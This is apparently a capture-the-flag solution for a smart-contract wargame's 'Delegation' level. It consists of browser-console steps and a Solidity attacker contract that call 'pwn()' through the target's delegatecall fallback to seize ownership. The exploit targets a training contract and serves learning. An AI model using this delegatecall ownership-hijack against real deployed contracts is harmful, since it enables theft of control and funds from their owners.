// 1 - Create Payload - Chrome Console
// let payload = web3.eth.abi.encodeFunctionSignature({
//     name: 'pwn',
//     type: 'function',
//     inputs: []
// });

// 2 - Call the instance contract - Chrome Console
// await web3.eth.sendTransaction({
//     from: player,
//     to: instance,
//     data: payload
// });

// 3 - Check the owner: await contract.owner() - Chrome Console

// Must Read: https://gist.github.com/spalladino/a349f0ca53dbb5fc3914243aaf7ea8c6

// Change the owner to a contract address via Smart Contract
pragma solidity ^0.6.0;

interface IDelegation {}

contract DelegationAttacker {
    IDelegation public delegation;

    constructor(address challengeAddress) public {
        delegation = IDelegation(challengeAddress);
    }

    function attack() external payable {
        // call delegation contract with msg.value as pwn function
        (bool result, ) = address(delegation).call(
            abi.encodeWithSignature("pwn()")
        );
        require(result, "invalid");
    }
}
